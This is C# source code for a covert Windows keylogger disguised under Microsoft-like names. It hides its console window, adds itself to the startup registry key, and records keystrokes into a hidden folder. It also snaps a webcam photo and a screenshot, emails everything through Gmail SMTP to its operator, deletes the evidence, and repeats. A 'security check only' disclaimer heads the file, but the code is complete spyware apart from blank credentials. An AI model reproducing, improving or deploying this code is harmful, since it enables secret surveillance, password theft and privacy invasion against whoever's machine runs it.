/*  
 *  THIS PROGRAM IS CREATED ONLY FOR SECURITY CHECK!
 *  THE AUTHOR IS NOT RESPONSIBLE FOR YOUR ACTIONS   
 */

using System;
using System.Linq;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Net.Mail;
using System.Net;
using System.Drawing;
using System.Drawing.Imaging;
using Emgu.CV;
using Microsoft.Win32;

namespace MicrosoftDll
{
    class Score
    {
        Program Prog = new Program();
        private readonly int Internal = 400; // number of characters through which the message will be sent
        private readonly string email = ""; // Gmail login
        private readonly string password = ""; // password
        public int score { get; private set; }
        public void pluScore() { score++; }
        public void reset() { score = 0; }

        private readonly string driveName = DriveInfo.GetDrives().Where(
            d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name; // says which drive we are in (like C://)

        public string DriveName
        {
            get
            {
                return driveName;
            }
        }

        public string Email
        {
            get { return email; }
        }

        public string Password
        {
            get { return password; }
        }

        public int interval
        {
            get { return Internal; }
        }

        public void helpMainGoStart()
        {
            Prog.Start();
        }
    }

    class Program
    {
        // Next are the necessary DLLs to check the status of the keyboard

        [DllImport("User32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public const string alphabets = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        private string toStringText; // the variable in which the symbol will be converted to string

        public void Start()
        {
            Score score = new Score();
            string[] numbers = { "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9", "D0" };
            string[] specialChars = { "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "" };
            string path = score.DriveName + "winr2456dll\\" + "logwinr2456dll.txt";  // the path where our files will be (text, photo, screenshot)

            while (score.score < score.interval)
            {
                Thread.Sleep(10);
                for (int i = 0; i < 255; i++) // check each key
                {
                    int keyState = GetAsyncKeyState(i); // key state
                    if (keyState == 1 || keyState == -32767) // if the key is pressed
                    {
                        score.pluScore();
                        // So computer science lessons came in handy :)
                        bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0; // is pressed caps lock?
                        bool shift = Control.ModifierKeys == Keys.Shift;
                        toStringText = Convert.ToString((Keys)i);

                        if (numbers.Contains(toStringText) && !shift) // this is the number
                        {
                            string number = Convert.ToString(toStringText.ToArray()[1]);
                            toStringText = number;
                        }

                        if (alphabets.Contains(toStringText)) // this is the alphabet
                        {
                            if (!CapsLock && !(shift) || CapsLock && shift)
                            {
                                toStringText = toStringText.ToLower();
                            }
                        }

                        else if (numbers.Contains(toStringText))
                        {
                            if (shift)
                            {
                                switch (toStringText)
                                {
                                    case "D1": { toStringText = "!"; break; }
                                    case "D2": { toStringText = "@"; break; }
                                    case "D3": { toStringText = "#"; break; }
                                    case "D4": { toStringText = "$"; break; }
                                    case "D5": { toStringText = "%"; break; }
                                    case "D6": { toStringText = "^"; break; }
                                    case "D7": { toStringText = "&"; break; }
                                    case "D8": { toStringText = "*"; break; }
                                    case "D9": { toStringText = "("; break; }
                                    case "D0": { toStringText = ")"; break; }
                                    default: { break; }
                                }
                            }
                        }

                        else if (toStringText.Contains("Oem") || string.Compare(toStringText, "Space") == 0)
                        {
                            switch (toStringText)
                            {
                                case "Oemtilde": { toStringText = shift ? "~" : "`"; break; }
                                case "OemMinus": { toStringText = shift ? "_" : "-"; break; }
                                case "Oemplus": { toStringText = shift ? "+" : "="; break; }
                                case "OemOpenBrackets": { toStringText = shift ? "{" : "["; break; }
                                case "Oem6": { toStringText = shift ? "}" : "]"; break; }
                                case "Oem5": { toStringText = shift ? "|" : "\\"; break; }
                                case "Oem1": { toStringText = shift ? ":" : ";"; break; }
                                case "Oem7": { toStringText = shift ? "\"" : "'"; break; }
                                case "Oemcomma": { toStringText = shift ? "<" : ","; break; }
                                case "OemPeriod": { toStringText = shift ? ">" : "."; break; }
                                case "OemQuestion": { toStringText = shift ? "?" : "/"; break; }
                                case "Space": { toStringText = " "; break; }
                                default: { break; }
                            }
                        }

                        else
                        {
                            if (string.Compare(toStringText, "ShiftKey") == 0 || // dont want the "unnecessary" keys displayed 
                               string.Compare(toStringText, "RShiftKey") == 0 ||
                               string.Compare(toStringText, "LShiftKey") == 0 ||
                               string.Compare(toStringText, "LButton") == 0 ||
                               string.Compare(toStringText, "RButton") == 0)
                            {
                                toStringText = "";
                            }

                            else { toStringText = "<em style=\"color:#808080\">[" + toStringText + "]</em>"; } // send everything else beautifully
                        }

                        File.AppendAllText(path, toStringText); // write everything to a file
                    }
                }
            }

            string photoPath = score.DriveName + @"winr2456dll\web.jpg";
            string screenPath = score.DriveName + @"winr2456dll\printscreen.jpg";
            VideoCapture capture = new VideoCapture(); // capture a photo
            Bitmap image = capture.QueryFrame().Bitmap;
            capture.Dispose(); // free webcam
            image.Save(photoPath); // save

            Bitmap printscreen = new Bitmap(
                Screen.PrimaryScreen.Bounds.Width,
                Screen.PrimaryScreen.Bounds.Height);

            Graphics graphics = Graphics.FromImage(printscreen as Image); //take a screenshot
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
            printscreen.Save(screenPath, ImageFormat.Jpeg);
            SendMail(); // send everything that we recorded
        }

        public void SendMail()
        {
            Score score = new Score();
            string pathPhoto = score.DriveName + @"winr2456dll\web.jpg";
            string pathImage = score.DriveName + @"winr2456dll\printscreen.jpg";

            LinkedResource inlinePhoto = new LinkedResource(pathPhoto); // attach a photo
            inlinePhoto.ContentId = Guid.NewGuid().ToString();
            Attachment attPhoto = new Attachment(pathPhoto);
            attPhoto.ContentDisposition.Inline = true;

            LinkedResource inline = new LinkedResource(pathImage); // attach a screenshot
            inline.ContentId = Guid.NewGuid().ToString();
            Attachment att = new Attachment(pathImage);
            att.ContentDisposition.Inline = true;

            string path = score.DriveName + "winr2456dll\\" + "logwinr2456dll.txt";
            var mail = new MailAddress(score.Email, "KILLATIV");
            MailAddress toMail = new MailAddress(score.Email);
            using (MailMessage message = new MailMessage(mail, toMail)) // send mail to yourself

            using (SmtpClient smtpClient = new SmtpClient())
            {
                if (File.Exists(path))
                {
                    message.IsBodyHtml = true;
                    message.Subject = "KAYLOGGER";
                    message.Body += String.Format(
                        "<strong>#### Time -- " +
                        DateTime.Now.ToString("g") +
                        " ####<br/>#### Model -- " +
                        Environment.MachineName +
                        " ####</strong><br/><br/>"); // sending time and computer name

                    message.Body += File.ReadAllText(path); // text file
                    message.Body += String.Format("<h3>Screenshot and Photo:<h3>", inline.ContentId);
                    message.Body += String.Format("----------------------------------------------", inlinePhoto.ContentId);
                    smtpClient.Host = "smtp.gmail.com";
                    smtpClient.Port = 587;
                    smtpClient.EnableSsl = true;
                    smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
                    smtpClient.UseDefaultCredentials = false;
                    message.Attachments.Add(att);
                    message.Attachments.Add(attPhoto);
                    smtpClient.Credentials = new NetworkCredential(mail.Address, score.Password);
                    smtpClient.Send(message);
                    inline.Dispose();
                    att.Dispose();
                    inlinePhoto.Dispose();
                    attPhoto.Dispose();
                    File.Delete(path); // delete all created files from the computer
                    File.Delete(pathImage);
                    File.Delete(pathPhoto);
                    score.reset(); // reset the counter
                    Start(); // do it all over again
                }
            }
        }

        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);// hide application
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("MicrosoftDllSQL.exe", Application.ExecutablePath); //Add to startup
            Score score = new Score();
            string path = score.DriveName + "winr2456dll\\"; //path where all files will be
            DirectoryInfo di = Directory.CreateDirectory(path);
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden; // hide file
            score.helpMainGoStart(); // Start
        }
    }
}